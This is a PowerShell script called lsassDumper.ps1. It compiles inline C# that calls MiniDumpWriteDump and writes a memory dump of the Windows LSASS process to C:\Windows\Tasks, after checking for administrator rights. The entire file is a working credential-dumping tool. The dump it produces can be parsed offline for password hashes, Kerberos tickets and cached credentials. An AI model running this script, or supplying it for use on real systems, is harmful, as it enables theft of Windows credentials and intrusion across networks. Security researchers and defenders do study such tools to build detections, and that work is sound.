param (
    [string]$Path = "C:\Windows\Tasks",
    [switch]$Help
)

if ($Help) {
    Write-Host "Usage: .\lsassDumper.ps1 [-Path <custom_directory>] [-Help]"
    Write-Host "Example:"
    Write-Host "    .\lsassDumper.ps1 -Path 'D:\CustomPath'"
    Write-Host ""
    Write-Host "Parameters:"
    Write-Host "    -Path    Specifies the directory where the minidump file will be saved. Default is 'C:\Windows\Tasks'."
    Write-Host "    -Help    Displays this help message."
    exit
}

# C# code for invoking MiniDumpWriteDump from dbghelp.dll
$csharpCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using System.IO;

public class MiniDumpUtility {
    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, Int32 ProcessId, SafeFileHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    public static bool CreateMiniDump(string dumpFile, string processName) {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0) return false;
        Process process = processes[0];

        using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.None)) {
            return MiniDumpWriteDump(process.Handle, process.Id, fs.SafeFileHandle, 2 /* MiniDumpNormal */, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
"@

# Add the C# type definition to the current PowerShell session
Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies "System.dll"

# Ensure running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script requires administrator privileges."
    exit
}

# Combine the path and file name
$dumpFilePath = Join-Path -Path $Path -ChildPath "lsass.dmp"

# Ensure the directory exists, create if not
if (-Not (Test-Path -Path $Path)) {
    New-Item -ItemType Directory -Path $Path | Out-Null
    Write-Host "Directory created at: $Path"
}

# Specify the process name
$processName = "lsass"

# Create the MiniDump
$dumpSuccess = [MiniDumpUtility]::CreateMiniDump($dumpFilePath, $processName)

if ($dumpSuccess) {
    Write-Host "Minidump created successfully at $dumpFilePath"
} else {
    Write-Host "Failed to create minidump."
}
